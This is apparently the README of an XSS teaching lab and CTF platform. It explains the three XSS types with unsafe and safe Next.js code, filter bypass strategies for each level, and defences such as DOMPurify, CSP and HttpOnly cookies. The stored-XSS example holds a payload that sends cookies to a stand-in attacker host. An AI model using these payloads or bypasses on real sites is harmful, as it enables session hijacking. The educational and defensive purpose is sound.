# XSS Academy - Interactive Security and Education Platform

Welcome to XSS Academy, an interactive educational playground and Capture
The Flag (CTF) platform built on Next.js to master Cross-Site Scripting
(XSS) vulnerabilities and modern defensive strategies.

This repository serves as a safe, sandboxed lab environment designed to
help developers, security engineers, and students understand how
client-side injection vulnerabilities occur, how attackers exploit them,
and how to programmatically implement foolproof remediation.

---

## Understanding Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) remains one of the most prevalent web
application security risks, historically ranking high in the OWASP
Top 10 vulnerabilities. It is a client-side code injection vulnerability
that occurs when an application includes untrusted user-supplied data in
a web page without proper validation, sanitization, or escaping. When
the web browser processes this data, it incorrectly interprets the
untrusted input as authentic, executable code.

Once an attacker successfully executes arbitrary JavaScript within the
victim's browser context, they operate under the authority of the
victim's active session. This allows the script to bypass the
Same-Origin Policy (SOP), access cookies, read local storage values,
exfiltrate sensitive session tokens, capture keystrokes, modify the
DOM layout, or perform unauthorized HTTP requests.

The Same-Origin Policy is a fundamental security mechanism in modern
browsers that prevents scripts running on one origin (e.g., attacker.com)
from accessing data on another origin (e.g., victim.com). XSS
bypasses SOP because the browser believes the malicious script
originated directly from the trusted web application.

---

## The Three Categories of XSS Explored in the Lab

This platform is divided into three key focus areas, each representing
a primary type of Cross-Site Scripting vulnerability:

### 1. Reflected XSS (Type 1)

Reflected XSS occurs when a web application immediately reflects
untrusted user input from an HTTP request back into the HTTP response.
The payload is typically embedded within a URL parameter or query
parameter, meaning the victim must click on a malicious link crafted
by the attacker.

*   **Vulnerability Mechanism**:
    User Input -> URL Parameter -> HTTP Request -> Unsanitized Reflection in HTML -> Execution.

*   **Example Vector**:
    `https://victim.com/search?q=<script>alert(1)</script>`

*   **Unsafe Next.js Code Pattern**:
    ```tsx
    // UNSAFE: Directly rendering raw input from search params
    const query = searchParams.get('q');
    return <div dangerouslySetInnerHTML={{ __html: query }} />;
    ```

*   **Safe Next.js Code Pattern**:
    ```tsx
    // SAFE: Allowing React to encode the string by default
    const query = searchParams.get('q');
    return <div>{query}</div>;
    ```

*   **Impact**:
    Session hijacking, target credential theft via phishing forms,
    and unauthorized actions executed on behalf of the victim.

### 2. Stored XSS (Type 2)

Stored XSS, also known as Persistent XSS, is the most dangerous
type of XSS. It occurs when user input is saved on the server (e.g.,
in a database, a comment section, a file system, or a profile page)
and later served to other users without sanitization.

*   **Vulnerability Mechanism**:
    User Input -> Saved to Database -> Served to Subsequent Users -> Execution.

*   **Example Vector**:
    `<img src="x" onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)">`

*   **Unsafe Code Pattern**:
    ```tsx
    // UNSAFE: Displaying stored comments containing raw HTML
    return (
      <div>
        {comments.map((c) => (
          <p key={c.id} dangerouslySetInnerHTML={{ __html: c.text }} />
        ))}
      </div>
    );
    ```

*   **Safe Code Pattern**:
    ```tsx
    // SAFE: Using DOMPurify to sanitize HTML comments before rendering
    import DOMPurify from 'isomorphic-dompurify';
    return (
      <div>
        {comments.map((c) => (
          <p key={c.id} dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(c.text) }} />
        ))}
      </div>
    );
    ```

*   **Impact**:
    Widespread account takeover, self-propagating worms, and complete
    site defacement.

### 3. DOM-Based XSS (Type 0)

DOM-Based XSS occurs entirely within the client-side JavaScript code.
The vulnerability exists when user-controlled data from a source (like
`location.hash`, `window.name`, or `document.referrer`) is processed
by the browser and passed to an unsafe sink (such as `element.innerHTML`,
`document.write`, or `eval`) without proper sanitization.

*   **Vulnerability Mechanism**:
    Source (location.hash) -> Client-Side JavaScript Logic -> Sink (innerHTML) -> Execution.

*   **Example Vector**:
    `https://victim.com/#<img src=x onerror=alert(document.domain)>`

*   **Unsafe Code Pattern**:
    ```javascript
    // UNSAFE: Reading from hash source and writing to innerHTML sink
    const hashData = decodeURIComponent(window.location.hash.substring(1));
    document.getElementById('output').innerHTML = hashData;
    ```

*   **Safe Code Pattern**:
    ```javascript
    // SAFE: Using textContent sink instead of innerHTML
    const hashData = decodeURIComponent(window.location.hash.substring(1));
    document.getElementById('output').textContent = hashData;
    ```

*   **Impact**:
    Manipulating client-side application state, stealing client-side
    authentication tokens, and defacing single-page applications.

---

## Detailed Walkthrough of the CTF Bypass Levels

To help you build strong bypass skills, the CTF Arena is structured
into distinct filter environments:

### Level 1: Standard Reflection
*   **Filter Logic**:
    No input filters are implemented.
*   **Vulnerability**:
    The raw input is written directly into the DOM.
*   **Bypass Strategy**:
    Use a basic script tag to verify alert execution.

### Level 2: Simple Case-Sensitive Filter
*   **Filter Logic**:
    The backend strips out exact `<script>` sequences.
*   **Vulnerability**:
    The filter matches only the exact lowercase string.
*   **Bypass Strategy**:
    Alternate casing to bypass case-sensitive string matching
    (e.g., `<sCrIpT>`).

### Level 3: Non-Recursive Stripping Filter
*   **Filter Logic**:
    The app removes occurrences of `<script>` but does so
    non-recursively.
*   **Vulnerability**:
    The system runs a single replacement iteration.
*   **Bypass Strategy**:
    Nest the forbidden tag within another tag (e.g., `<scr<script>ipt>`).
    When the inner tag is stripped, the outer tag merges to form
    a complete tag.

### Level 4: Context Breakout
*   **Filter Logic**:
    Input is placed inside the value attribute of an input field.
*   **Vulnerability**:
    The code escapes HTML brackets but does not sanitize quotes.
*   **Bypass Strategy**:
    Inject a closing quotation mark to break out of the attribute
    block, then register an inline event handler such as `onfocus`
    or `onmouseover`.

### Level 5: Event Handler Blocklist
*   **Filter Logic**:
    Event handlers containing common keywords like `onerror` are
    filtered out.
*   **Vulnerability**:
    The blocklist is not comprehensive.
*   **Bypass Strategy**:
    Leverage less common element tags (such as `iframe` or `svg`)
    combined with javascript URIs inside source links or alternative
    event hooks.

---

## Hacker Monitor Logs Dashboard

To demonstrate the impact of XSS, the project integrates a simulated
attacker listener dashboard. When your payload executes an action like
reading cookies or logging keystrokes, the activity is sent to the
Hacker Monitor console.

The logs output tracks:
*   Timestamp of execution
*   Simulated user cookie values
*   Keystrokes captured by dynamic event listeners
*   Active URL path of execution

---

## Local Environment Setup and Configuration

Follow these steps to run the platform locally on your computer:

### Prerequisites
Make sure you have Node.js (version 18 or higher) installed on your machine.

### Installation Steps
1. Clone the repository to your local directory:
   ```bash
   git clone https://github.com/EngHemn/XSS-learning.git
   ```
2. Navigate into the project folder:
   ```bash
   cd XSS-learning
   ```
3. Install the required Node packages:
   ```bash
   npm install
   ```
4. Start the local Next.js development server:
   ```bash
   npm run dev
   ```
5. Open your web browser and navigate to:
   ```
   http://localhost:3000
   ```

---

## Modern Defensive Methods and Implementation Guide

Securing your application against Cross-Site Scripting requires a
multi-layered defense-in-depth approach:

### 1. Context-Aware Output Encoding
Never trust user input when rendering it back to the browser. Depending
on where the data is placed, apply the appropriate encoding strategy:
*   **HTML Entity Encoding**:
    Convert characters like `<`, `>`, `&`, `"`, and `'` to their respective
    HTML entities (e.g., `&lt;`, `&gt;`). This prevents the browser from
    interpreting them as tags.
*   **JavaScript Encoding**:
    When placing user input inside inline `<script>` blocks or JSON
    configurations, ensure characters are Unicode escaped (e.g., `\u003C`
    instead of `<`).
*   **Attribute Encoding**:
    Encode values placed inside HTML attributes to prevent breaking out of
    attribute quotes.

### 2. DOMPurify Integration
When you must allow users to input rich HTML content (e.g., in blog editors
or text formatting), use a vetted library like DOMPurify to strip out
malicious scripts, event handlers, and unsafe attributes.
```tsx
import DOMPurify from 'dompurify';

function SafeHtmlRenderer({ userMarkup }) {
  const cleanMarkup = DOMPurify.sanitize(userMarkup, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
  });
  
  return <div dangerouslySetInnerHTML={{ __html: cleanMarkup }} />;
}
```

### 3. Content Security Policy (CSP)
A Content Security Policy is a powerful HTTP response header that restricts
the resources (such as JavaScript, CSS, Images) that the browser is allowed
to load for a given page. It mitigates XSS by preventing unauthorized script
execution.

A secure example policy:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-randomhash123' https://trusted-cdn.com; object-src 'none'; base-uri 'self';
```

By disallowing `'unsafe-inline'` and configuring nonces or hashes, you can
block scripts injected by attackers from executing, even if they succeed in
placing them on the page.

### 4. HttpOnly Cookies
To defend against session hijacking via cookie theft, configure
authentication cookies with the HttpOnly flag. This ensures that
client-side JavaScript APIs (like `document.cookie`) cannot read or
access them.

---

## XSS vs SQL Injection vs CSRF

Understanding the differences between these vulnerabilities is key
to general security:

*   **XSS (Cross-Site Scripting)**:
    Target: The client-side browser.
    Goal: Run malicious JavaScript in the context of the user session.
    Remediation: Encoding output, sanitizing HTML, strict CSP headers.
*   **SQL Injection (SQLi)**:
    Target: The server-side database.
    Goal: Manipulate SQL queries to view, delete, or modify database entries.
    Remediation: Using parameterized queries, ORM frameworks, input validation.
*   **CSRF (Cross-Site Request Forgery)**:
    Target: Server-side actions on behalf of a user.
    Goal: Trick a logged-in user into submitting a state-changing request.
    Remediation: Anti-CSRF tokens, SameSite cookie attributes.

---

## Security Audit and Verification Flowchart

The checklist below represents the standard validation path for testing
client-side variables:

1. Identify every data source entering the application.
2. Track where the variables are written (the rendering sink).
3. If writing to HTML context: Validate output escaping.
4. If writing to DOM directly: Use safe APIs (like textContent or secure sanitizers).
5. Apply Content Security Policy headers to block rogue script domains.

---

## Disclaimer and Educational Scope

This application is created strictly for educational, security research,
and defensive development training. All simulated vulnerabilities run
inside a local, browser-sandboxed environment. Do not use the techniques
shown here to target external web systems or unauthorized production sites.
